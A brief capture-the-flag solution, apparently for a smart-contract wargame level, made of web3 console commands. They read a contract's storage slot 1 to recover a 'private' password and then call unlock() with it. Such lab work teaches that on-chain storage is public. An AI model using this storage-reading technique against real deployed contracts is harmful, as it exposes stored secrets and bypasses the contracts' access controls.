await web3.eth.getStorageAt('0x734510015e490aE836CfaC3dfC97dddbd4fa8aAe');
//returns 0x0000000000000000000000000000000000000000000000000000000000000001 this means there's storage at 0x01
web3.eth.getStorageAt('0x734510015e490aE836CfaC3dfC97dddbd4fa8aAe', 1)
//Get the storage located at 0x01 - returns 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
//This is the private variable password
contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29');
//win